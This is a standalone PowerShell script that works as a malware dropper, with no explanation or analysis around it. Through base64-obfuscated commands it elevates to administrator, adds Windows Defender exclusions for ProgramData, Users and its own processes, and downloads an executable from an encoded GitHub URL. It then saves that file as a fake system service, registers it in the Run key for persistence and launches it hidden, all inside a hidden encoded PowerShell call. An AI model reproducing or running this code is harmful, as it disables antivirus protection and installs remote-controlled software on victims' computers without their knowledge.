$s = {
    $a = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aQBmACAAKAAhACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAXQBbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMATgBSAG8AbABlACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAQgB1AGkAbAB0AEkAbgBSAG8AbABlAF0AOgA6AEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAKQApACAAewAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQACAALQBFAHgAIABCAHkAcABhAHMAAHMAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBQAEMAbwBtAG0AYQBuAGQAIAAkACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAE0AeQBJAG4AdgBvAGMAYQB0AGkAbwBuAC4ATQB5AEMAbwBtAG0AYQBuAGQALgBEAGUAZgBpAG4AaQB0AGkAbwBuACkAKQApACIAIAAtAFYAZQByAGIAIABSAHUAbgBBAHMAOwAgAGUAeABpAHQAIAB9AA=='));
    Invoke-Expression $a;

    $ex = "Add-MpPreference -ExclusionPath 'C:\ProgramData','C:\Users' -ExclusionProcess 'powershell.exe','win_sys_service.exe'";
    Invoke-Expression $ex;

    Start-Sleep -s 5;

    $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL3NyYXAxOC9kZG9zcy9yYXcvcmVmcy9oZWFkcy9tYWluL1N5c3RlbVVwZGF0ZS5leGU='));
    $path = "C:\ProgramData\win_sys_service.exe";

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
    try {
        $w = New-Object System.Net.WebClient;
        $w.DownloadFile($url, $path);
        Unblock-File -Path $path;
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$path`"";
        Start-Process -FilePath $path -WindowStyle Hidden;
    } catch {}
}.ToString()

$e = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))
powershell.exe -NoP -W Hidden -Enco $e
